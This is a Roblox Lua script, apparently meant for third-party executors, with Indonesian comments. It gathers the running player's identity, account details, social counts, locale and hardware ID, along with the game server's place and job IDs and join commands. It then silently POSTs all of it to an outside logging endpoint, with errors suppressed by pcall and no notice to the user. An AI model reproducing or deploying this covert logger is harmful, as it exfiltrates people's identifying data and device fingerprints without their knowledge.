local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")
local LocalizationService = game:GetService("LocalizationService")

local LocalPlayer = Players.LocalPlayer

-- ==========================================
-- AMBIL INFO PLAYER
-- ==========================================
local Name = LocalPlayer.Name
local DName = LocalPlayer.DisplayName
local UserId = tostring(LocalPlayer.UserId)
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local CountryCode = "Unknown"
pcall(function() CountryCode = LocalizationService.RobloxLocaleId end)

local GetHwid = "Not Supported"
pcall(function() GetHwid = tostring(RbxAnalytics:GetClientId()) end)

local FriendsCount, FollowersCount, FollowingCount = "0", "0", "0"
pcall(function()
    FriendsCount = tostring(HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/friends/count")).count)
    FollowersCount = tostring(HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followers/count")).count)
    FollowingCount = tostring(HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followings/count")).count)
end)

local TotalDays = LocalPlayer.AccountAge
local Years = math.floor(TotalDays / 365)
local Months = math.floor((TotalDays % 365) / 30)
local AgeFormatted = string.format("%d Hari / %d Bulan / %d Tahun", TotalDays, Months, Years)

local MonthsList = {"Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"}
local DateTable = os.date("*t")
local ExecutedTime = string.format("%d %s %d | %02d:%02d:%02d",
    DateTable.day, MonthsList[DateTable.month], DateTable.year,
    DateTable.hour, DateTable.min, DateTable.sec
)

-- ==========================================
-- AMBIL INFO GAME
-- ==========================================
local GameName = "Unknown"
pcall(function() GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)

local JobId = game.JobId or "Unknown"
local PlaceId = tostring(game.PlaceId)
local PlayerCount = tostring(#Players:GetPlayers()) .. "/" .. tostring(Players.MaxPlayers)

local JoinCode = string.format("Roblox.GameLauncher.joinGameInstance(%s, '%s')", PlaceId, JobId)
local JoinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)', PlaceId, JobId)

-- ==========================================
-- DETECT EXECUTOR
-- ==========================================
local Executor = "Unknown"
pcall(function()
    if identifyexecutor then
        Executor = identifyexecutor()
    elseif syn then
        Executor = "Synapse X"
    elseif KRNL_LOADED then
        Executor = "Krnl"
    elseif pebc then
        Executor = "Electron"
    end
end)

-- ==========================================
-- SCRIPT NAME
-- ==========================================
local ScriptName = (type(SCRIPT_NAME) == "string" and SCRIPT_NAME ~= "" and SCRIPT_NAME) or "Unknown"

-- ==========================================
-- KIRIM LOG
-- ==========================================
pcall(function()
    local fields = {
        { name = "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
        { name = "📛 Display Name", value = DName, inline = false },
        { name = "👤 Username", value = Name, inline = false },
        { name = "🆔 User ID", value = UserId, inline = false },
        { name = "💎 Membership", value = MembershipType, inline = false },
        { name = "🎂 Account Age", value = AgeFormatted, inline = false },
        { name = "👥 Friends/Followers/Following", value = FriendsCount.."/"..FollowersCount.."/"..FollowingCount, inline = false },
        { name = "🚩 Locale", value = CountryCode, inline = false },
        { name = "⚙️ Executor", value = Executor, inline = false },
        { name = "💻 HWID", value = GetHwid, inline = false },
        { name = "⏰ Executed Time", value = ExecutedTime, inline = false },
        { name = "📜 Script", value = ScriptName, inline = false },
        { name = "━━━━━━━━━━━━━━ 🎮 SERVER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
        { name = "🎮 Game", value = GameName, inline = false },
        { name = "🆔 Place ID", value = PlaceId, inline = false },
        { name = "👥 Players", value = PlayerCount, inline = false },
        { name = "🔑 Job ID", value = JobId, inline = false },
        { name = "📜 Console Join", value = JoinCode, inline = false },
        { name = "📜 Executor Join", value = JoinScript, inline = false }
    }

    local requestFunc = (syn and syn.request) or http_request or request or HttpPost
    if requestFunc then
        requestFunc({
            Url = "https://api-ndraawz.vercel.app/api/logger/log",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                type = "player",
                fields = fields
            })
        })
    end
end)
